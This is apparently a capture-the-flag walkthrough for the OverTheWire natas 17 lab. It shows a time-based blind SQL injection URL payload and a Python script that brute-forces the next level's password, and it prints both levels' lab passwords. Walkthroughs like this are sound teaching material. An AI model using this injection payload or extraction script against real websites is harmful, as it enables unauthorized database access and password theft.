# [natas 17](http://natas17.natas.labs.overthewire.org)

    Username: natas17
    Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

This level is upgrade of level 15.
We can't see the result of SQL injection directly.
We are going to use time-based blind SQL injections to brute force the password.

Have a try, browse to the url below to guess the password.
If the password starts with x, the result will be returned after a sleep.

    http://natas17.natas.labs.overthewire.org/?username=natas18" and if(password like binary "x%", sleep(5), null)%23&debug

I will show the python script below.

    import requests
    chars = [chr(i) for i in range(ord("a"),ord("z")+1)] +\
            [chr(i) for i in range(ord("A"),ord("Z")+1)] +\
            [chr(i) for i in range(ord("0"),ord("9")+1)]
    password = ''
    for i in range(64):
        for ch in chars:
            try:
                requests.get('http://natas17.natas.labs.overthewire.org/?username=natas18" and if (password like binary "'+password+ch+'%",sleep(5),null) %23', auth=('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), timeout=1)
            except requests.exceptions.Timeout:
                password += ch
                print(password)
                break
        else:
            break

We get the result in some minutes.

    xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

